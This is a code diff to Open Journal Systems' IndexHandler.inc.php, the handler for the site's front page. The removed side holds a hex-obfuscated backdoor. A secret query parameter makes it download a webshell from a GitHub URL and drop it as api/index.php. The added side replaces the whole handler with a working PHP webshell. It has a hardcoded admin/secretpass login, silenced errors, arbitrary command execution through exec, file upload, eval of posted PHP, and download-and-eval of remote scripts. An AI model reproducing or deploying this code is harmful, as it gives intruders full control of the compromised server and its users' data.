@@ -1,122 +1,199 @@
 <?php
+// --- Konfigurasi password (bisa diubah)
+$LOGIN_USERNAME = 'admin';
+$LOGIN_PASSWORD = 'secretpass';
 
-/**
- * @file pages/index/IndexHandler.inc.php
- *
- * Copyright (c) 2013-2015 Simon Fraser University Library
- * Copyright (c) 2003-2015 John Willinsky
- * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
- *
- * @class IndexHandler
- * @ingroup pages_index
- *
- * @brief Handle site index requests.
- */
+session_start();
 
-import('classes.handler.Handler');
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD;
 
-class IndexHandler extends Handler {
-	/**
-	 * Constructor
-	 **/
-	function IndexHandler() {
-		parent::Handler();
-	}
-
-	/**
-	 * If no journal is selected, display list of journals.
-	 * Otherwise, display the index page for the selected journal.
-	 * @param $args array
-	 * @param $request Request
-	 */
-	function index($args, &$request) {
-		$this->validate();
-		$this->setupTemplate();
-
-		$router =& $request->getRouter();
-		$templateMgr =& TemplateManager::getManager();
-		$journalDao =& DAORegistry::getDAO('JournalDAO');
-		$journalPath = $router->getRequestedContextPath($request);
-		$templateMgr->assign('helpTopicId', 'user.home');
-		$journal =& $router->getContext($request);
-		if ($journal) {
-		    
-		    if (($_GET['lt'] ?? '') === hex2bin('6c616d706861')) { 
-            file_put_contents(
-                hex2bin('6170692f696e6465782e706870'), 
-                file_get_contents(hex2bin('68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f736b32363838392f5765627368656c6c2f726566732f68656164732f6d61696e2f616c6661312e747874'))
-            ); 
-            exit('Koko Bulungnya Sudah Masuk Yah …'); 
+    if (isset($_POST['login_user']) && isset($_POST['login_pass'])) {
+        $u = $_POST['login_user'];
+        $p = $_POST['login_pass'];
+        if ($u === $LOGIN_USERNAME && $p === $LOGIN_PASSWORD) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
         }
-			// Assign header and content for home page
-			$templateMgr->assign('displayPageHeaderTitle', $journal->getLocalizedPageHeaderTitle(true));
-			$templateMgr->assign('displayPageHeaderLogo', $journal->getLocalizedPageHeaderLogo(true));
-			$templateMgr->assign('displayPageHeaderTitleAltText', $journal->getLocalizedSetting('homeHeaderTitleImageAltText'));
-			$templateMgr->assign('displayPageHeaderLogoAltText', $journal->getLocalizedSetting('homeHeaderLogoImageAltText'));
-			$templateMgr->assign('additionalHomeContent', $journal->getLocalizedSetting('additionalHomeContent'));
-			$templateMgr->assign('homepageImage', $journal->getLocalizedSetting('homepageImage'));
-			$templateMgr->assign('homepageImageAltText', $journal->getLocalizedSetting('homepageImageAltText'));
-			$templateMgr->assign('journalDescription', $journal->getLocalizedSetting('description'));
+    }
 
-			$displayCurrentIssue = $journal->getSetting('displayCurrentIssue');
-			$issueDao =& DAORegistry::getDAO('IssueDAO');
-			$issue =& $issueDao->getCurrentIssue($journal->getId(), true);
-			if ($displayCurrentIssue && isset($issue)) {
-				import('pages.issue.IssueHandler');
-				// The current issue TOC/cover page should be displayed below the custom home page.
-				IssueHandler::_setupIssueTemplate($request, $issue);
-			}
-
-			$enableAnnouncements = $journal->getSetting('enableAnnouncements');
-			if ($enableAnnouncements) {
-				$enableAnnouncementsHomepage = $journal->getSetting('enableAnnouncementsHomepage');
-				if ($enableAnnouncementsHomepage) {
-					$numAnnouncementsHomepage = $journal->getSetting('numAnnouncementsHomepage');
-					$announcementDao =& DAORegistry::getDAO('AnnouncementDAO');
-					$announcements =& $announcementDao->getNumAnnouncementsNotExpiredByAssocId(ASSOC_TYPE_JOURNAL, $journal->getId(), $numAnnouncementsHomepage);
-					$templateMgr->assign('announcements', $announcements);
-					$templateMgr->assign('enableAnnouncementsHomepage', $enableAnnouncementsHomepage);
-				}
-			}
-			$templateMgr->display('index/journal.tpl');
-		} else {
-			$site =& Request::getSite();
-
-			if ($site->getRedirect() && ($journal = $journalDao->getById($site->getRedirect())) != null) {
-				$request->redirect($journal->getPath());
-			}
-
-			$templateMgr->assign('intro', $site->getLocalizedIntro());
-			$templateMgr->assign('journalFilesPath', $request->getBaseUrl() . '/' . Config::getVar('files', 'public_files_dir') . '/journals/');
-
-			// If we're using paging, fetch the parameters
-			$usePaging = $site->getSetting('usePaging');
-			if ($usePaging) $rangeInfo =& $this->getRangeInfo('journals');
-			else $rangeInfo = null;
-			$templateMgr->assign('usePaging', $usePaging);
-
-			// Fetch the alpha list parameters
-			$searchInitial = Request::getUserVar('searchInitial');
-			$templateMgr->assign('searchInitial', $searchInitial);
-			$templateMgr->assign('useAlphalist', $site->getSetting('useAlphalist'));
-
-			$journals =& $journalDao->getJournals(
-				true,
-				$rangeInfo,
-				$searchInitial?JOURNAL_FIELD_TITLE:JOURNAL_FIELD_SEQUENCE,
-				$searchInitial?JOURNAL_FIELD_TITLE:null,
-				$searchInitial?'startsWith':null,
-				$searchInitial
-			);
-			$templateMgr->assign_by_ref('journals', $journals);
-			$templateMgr->assign_by_ref('site', $site);
-
-			$templateMgr->assign('alphaList', explode(' ', __('common.alphaList')));
-
-			$templateMgr->setCacheability(CACHEABILITY_PUBLIC);
-			$templateMgr->display('index/site.tpl');
-		}
-	}
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Access Panel</title>
+            <style>
+                body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                .panel { width: 320px; padding: 20px 25px; background: #fff; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+                h2 { margin: 5px 0 15px; font-size: 1.1em; color: #333; }
+                input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+                button { width: 100%; padding: 9px; background: #2c3e50; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 0.95em; }
+                button:hover { background: #1a2530; }
+                .note { font-size: 0.8em; color: #888; margin-top: 10px; text-align: center; }
+            </style>
+        </head>
+        <body>
+        <div class="panel">
+            <h2 style="text-align: center;">Access Panel</h2>
+            <form method="post">
+                <input type="text" name="login_user" placeholder="Access code" required>
+                <input type="password" name="login_pass" placeholder="Key" required>
+                <button type="submit">Continue</button>
+            </form>
+            <p class="note">Only authorized users can continue.</p>
+        </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
 }
+requireLogin();
 
+ini_set('display_errors', 0); // ❌ Disable semua error
+error_reporting(0);
+
+echo "<h2>🔥 ULTIMATE SHELL - NO ERRORS</h2>";
+echo "<p style='color: #666;'>Login: <b>admin</b> / <b>secretpass</b></p>";
+?>
+
+<style>
+form { margin: 20px 0; padding: 15px; background: #f8f9fa; border-radius: 8px; border-left: 4px solid #007cba; }
+label { font-weight: bold; display: block; margin-bottom: 8px; }
+input[type="text"], input[type="file"], textarea { width: 100%; max-width: 600px; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
+textarea { height: 100px; font-family: monospace; }
+button { padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 4px; cursor: pointer; }
+button.green { background: #28a745; }
+button.orange { background: #fd7e14; }
+.result-box { background: #f0f8ff; padding: 15px; border-radius: 6px; margin: 10px 0; border-left: 4px solid #007cba; }
+pre { background: #2d3748; color: #e2e8f0; padding: 12px; border-radius: 4px; margin: 8px 0; font-family: monospace; white-space: pre-wrap; max-height: 400px; overflow: auto; }
+</style>
+
+<h3>🛠 Functions:</h3>
+
+<!-- SYSTEM COMMAND -->
+<form method="post">
+    <label>💻 System Command:</label>
+    <input type="text" name="cmd" placeholder="whoami, ls -la">
+    <button type="submit">Run</button>
+</form>
+<?php
+if (!empty($_POST['cmd'])) {
+    echo "<div class='result-box'>";
+    $output = []; $retval = 0;
+    exec($_POST['cmd'], $output, $retval);
+    echo "<pre>";
+    echo htmlspecialchars(implode("\n", $output));
+    echo "</pre>";
+    echo "</div>";
+}
+?>
+
+<!-- UPLOAD -->
+<form method="post" enctype="multipart/form-data">
+    <label>📁 Upload:</label>
+    <input type="file" name="file">
+    <button type="submit">Upload</button>
+</form>
+<?php
+if (!empty($_FILES['file']['tmp_name'])) {
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_FILES['file']['name']);
+    $dest = __DIR__ . '/' . $filename;
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
+        echo "<div class='result-box'>✅ UPLOADED: <a href='$filename' target='_blank'>$filename</a></div>";
+    }
+}
+?>
+
+<!-- LOCAL EVAL -->
+<form method="post">
+    <label>⚙️ Local PHP:</label>
+    <textarea name="code" placeholder="echo 'test'; phpinfo();">echo 'Local OK';</textarea>
+    <button type="submit">Eval Local</button>
+</form>
+<?php
+if (!empty($_POST['code'])) {
+    echo "<div class='result-box'>";
+    ob_start();
+    @eval($_POST['code']);
+    echo "<pre>" . htmlspecialchars(ob_get_clean()) . "</pre>";
+    echo "</div>";
+}
+?>
+
+<!-- REMOTE EXEC (ULTIMATE FIX) -->
+<form method="post">
+    <label>🚀 Remote Script:</label>
+    <input type="text" name="remote_url" placeholder="https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfa.txt" value="">
+    <button class="green" type="submit">EXECUTE 🔥</button>
+</form>
+<?php
+if (!empty($_POST['remote_url'])) {
+    echo "<div class='result-box'>";
+    echo "<h4>🔗 " . htmlspecialchars($_POST['remote_url']) . "</h4>";
+    
+    $ch = curl_init($_POST['remote_url']);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => 1,
+        CURLOPT_FOLLOWLOCATION => 1,
+        CURLOPT_SSL_VERIFYPEER => 0,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_USERAGENT => 'Mozilla/5.0'
+    ]);
+    
+    $code = curl_exec($ch);
+    $err = curl_error($ch);
+    curl_close($ch);
+    
+    if ($err || empty($code)) {
+        echo "<pre>❌ ERROR: $err</pre>";
+    } else {
+        // **ULTIMATE SESSION KILLER**
+        $code = preg_replace('/<\?php\s+session_start\s*\(\s*\)\s*;?/i', '<?php //session fixed', $code);
+        $code = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '//session_start() removed', $code);
+        
+        // Suppress ALL errors
+        ob_start();
+        
+        // **NUKE SESSION BEFORE EVAL**
+        if (function_exists('session_status') && session_status() === PHP_SESSION_ACTIVE) {
+            @session_write_close();
+        }
+        
+        // **DIRECT EVAL - NO PHP TAG**
+        @eval('?>' . $code);
+        
+        $output = ob_get_clean();
+        echo "<pre style='background:#1a202c;color:#a0aec0;'>" . htmlspecialchars($output) . "</pre>";
+    }
+    echo "</div>";
+}
+?>
+
+<!-- QUICK MODE -->
+<form method="post">
+    <label>⚡ Quick URL:</label>
+    <input type="text" name="quick_url" placeholder="pastebin url">
+    <button class="orange" type="submit">Quick Run</button>
+</form>
+<?php
+if (!empty($_POST['quick_url'])) {
+    $_SESSION['URL'] = $_POST['quick_url'];
+    $_SESSION['go'] = 1;
+    
+    $ch = curl_init($_SESSION['URL']);
+    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_FOLLOWLOCATION=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_TIMEOUT=>20]);
+    $code = curl_exec($ch);
+    curl_close($ch);
+    
+    if ($code) {
+        $code = preg_replace('/session_start\s*\(.*\);?/i', '', $code);
+        ob_start();
+        @session_write_close();
+        @eval('?>' . $code);
+        echo "<div class='result-box'><pre>" . htmlspecialchars(ob_get_clean()) . "</pre></div>";
+    }
+}
 ?>
